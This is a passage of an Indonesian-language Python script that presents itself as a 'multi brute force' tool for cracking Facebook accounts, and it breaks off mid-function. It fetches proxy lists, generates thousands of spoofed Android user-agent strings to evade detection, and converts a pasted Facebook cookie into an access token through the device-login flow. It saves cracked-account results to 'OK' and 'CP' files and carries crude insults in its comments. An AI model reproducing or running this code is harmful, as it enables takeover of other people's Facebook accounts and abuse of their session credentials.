# pengkodean = python
# coding oleh BintangTzy
# Izin dlu lah bro kalau mau recode, gk ngotak njir_-
# Note : jangan di ubah lagi! nanti error, script nya udah enak
#-----------------[ IMPORT - PREMIUM ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from concurrent.futures import ThreadPoolExecutor as tred
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich.progress import track
from time import sleep
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as XyzonXD
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import print as prints
from rich import pretty
from rich.console import Console as sol
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.text import Text as tekz
dump = []
memek = []
ualu,ualuh = [],[]
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
	
###----------[ IMPORT MODULE RICH ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()
sys.stdout.write('\x1b]2;XMBF | XYZON MULTI BRUTE FACEBOOK\x07')
#---------Tahun---------#
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		elif fx[:5] in ['10008','10009']:tahunz = '2023'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
#------------------[ USER-AGENT ]-------------------#
uman,usman1=[],[]
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
printcp=[]
oks=[]
cps=[]
redmi=[]
ugent=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('\x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \x1b[1;96mLu Kagak Ada paket anjirt sihlakan beli paket di sugeng kalo mau carck')
	print('\x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \x1b[1;96mBtw Lu Miskin Yak Beli Paket Aja Kagak Mampu Awokawokawokawok')
	print('\x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \x1b[1;96mSalam Dari BintangTzy And XyzonXD ')
prox=open('.prox.txt','r').read().splitlines()
###----------[ GENERATE USERAGENT ]---------- ###
for xd in range(10000) :
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e='Mobile Safari/537.36'
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e='Mobile Safari/537.36'
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G (5) Plus Build/NPNS25.137-35-5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G (5S) Plus Build/NPS26.116-51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='moto e5 Build/OPPS27.91-176-11-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(6, 14) 
	c='SM-A105'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=str(random.randrange(10, 214))+'.0.'+str(random.randrange(3000, 7000))+'.'+str(random.randrange(10, 275)) 
	f=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	geko=f'{a} {b}; {c}) {d}{e} {f}'
	ugen2.append(geko) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G Play Build/NPIS26.48-43-2) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='RMX'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='CPH'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='vivo'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga) 
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen2.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
###----------[ CEK WARNA TEMA ]---------- ###
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	color_panel = "#00C8FF"
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[]
taplikasi=['no']
cokbrut=[]
method = []
pwpluss,pwnya=[],[]
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(panel(f"""
[bold white]                __   ____   __ ______ _____  _   _       
[bold red]      ▄▄▄▄     [bold white] \ \ / /\ \ / /|___  /|  _  || \ | |
[bold white]      ▀▀▀▀  [bold red]     \ V /  \ V /    / / | | | ||  \| |        [bold green]PremiumXD
[bold red]                 /   \   \ /    / /  | | | || . ` |        [bold cyan]By XyzonXD
[bold cyan]                / /^\ \  | |  ./ /___\ \_/ /| |\  |        [bold white]V.2.5
[bold cyan]                \/   \/  \_/  \_____/ \___/ \_| \_/
                 [bold red]▪︎[bold yellow]▪︎[bold green]▪︎[bold cyan] XYZON [bold yellow]MULTI [bold green]BRUTE [bold red]FORCE [bold red]▪︎[bold yellow]▪︎[bold green]▪︎
             """,width=90,title=f"[bold red][[bold cyan] By [bold green]Xyzon Dev [bold red]]",subtitle=f"[bold red][[bold cyan] SELAMAT DATANG DI LAYANAN KAMI BOSSKU [bold red]]",style=f"bold red"))
#------------------[ LOGO-LAKNAT V2]-----------------#
def logo():
	cetak(panel(f"""
[bold white]                 _____  _____  _____  _   __ _____  _____  _____ 
[bold red]      ▄▄▄▄    [bold white] /  __ \|  _  ||  _  || | / /|_   _||  ___|/  ___|
[bold white]      ▀▀▀▀  [bold red]   | /  \/| | | || | | || |/ /   | |  | |__  \ `--.       [bold green]PremiumXD
[bold red]               | |    | | | || | | ||    \   | |  |  __|  `--. \       [bold cyan]By XyzonXD
[bold cyan]               | \__/\\ \_/ /\ \_/ /| |\  \ _| |_ | |___ /\__/ /        [bold white]V.2.5
[bold cyan]                \____/ \___/  \___/ \_| \_/ \___/ \____/ \____/ 
                 [bold red]▪︎[bold yellow]▪︎[bold green]▪︎[bold cyan] XYZON [bold yellow]MULTI [bold green]BRUTE [bold red]FORCE [bold red]▪︎[bold yellow]▪︎[bold green]▪︎
             """,width=90,title=f"[bold red][[bold cyan] By [bold green]Xyzon Dev [bold red]]",subtitle=f"[bold red][[bold cyan] SELAMAT DATANG DI LAYANAN KAMI BOSSKU [bold red]]",style=f"bold red"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
	os.system('clear')
	logo()
	cetak(panel(f"[bold white][[bold green]01[bold white]] [bold cyan]Login Menggunakan Cookies [bold white][[bold green] ON [/][bold white]][/]\n[[bold green]02[bold white]] [bold cyan]Doa Sebelum Crack [bold white][[bold green] ON [/][bold white]][/]\n[[bold green]03[bold white]] [bold cyan]Cara Mengambil Cookies Facebook [bold white][[bold green] ON [/][bold white]][/]\n[[bold green]04[bold white]] [bold cyan]Cek Hasil Crack [bold white][[bold green] ON [/][bold white]][/]\n[[bold green]05[bold white]] [bold cyan]Hubungi Admin [bold white][[bold green] ON [/][bold white]][/]",width=90,title=f"[bold red][[bold green] Menu Login [bold red]]",style=f"bold red"))
	cetak(panel(f'[bold cyan]Anda Wajib Login Menggunakan Cookies Untuk Unlock Semua Fitur Spesial Yang Ada Di Script Ini [bold green]By XyzonXD',width=90,title=f"[bold red][[bold green] Informasi [bold red]]",style=f"bold red"))
	vevek = input(f' {P}[{H}+{P}]\33[1;96m Pilih Menu : {P}')
	if vevek in ['1','01']:
		laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadimariketemupepekkudajanganlarislebewindonesiaandlampungnihbossenggoldongnantimatiawokawokawokaowkawokawokawokawok()
	elif vevek in ['2','02']:
		doa_halal()
	elif vevek in ['3','03']:
		cetak(panel(f"[bold cyan]Anda Akan Di Arahkan Ke Youtube Dan Liat Lah Dengan Mata Kepala Anda Sendiri Bagaimana Mengambil Cookies Yang Benar Dan Ikut Tutorial Nya",width=90,title=f"[bold red][[bold green] Tutorial Cookies [bold red]]",style=f"bold red"))
		os.system("xdg-open https://youtu.be/iPs-ShFVOJA")
		time.sleep(3)
		exit()
	elif vevek in ['4','04']:
		result()
	elif vevek in ['5','05']:
		os.system("xdg-open https://wa.me/+6282183929059?text=Assalammualaikum+Bagi+Tutorial+Dong+Admin+Pemula+Nih")
		time.sleep(3)
		exit()
	else:
		print(' [+] \33[1;91mPilih Yang Bener Asu ')
		time.sleep(5)
		back()
		
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			li = ' Lu Kagak Ada Sinyal Anjirt Silahkan Beli Sinyal Di Sugeng Kalo Mau Carck'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login123()
		
def laknatxyzonlogincakculaynabuynabuykaktabuykaktabuybyxyzondisinivevekkudadimariketemupepekkudajanganlarislebewindonesiaandlampungnihbossenggoldongnantimatiawokawokawokaowkawokawokawokawok():
	try:
		cetak(nel('[bold cyan]Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account Facebook',width=90,title=f"[bold red][[bold green] Cookies [bold red]]",style=f"bold red"))
		your_cookies = input(' Cookie  : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" {P}[{H}+{P}] \33[1;91m Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
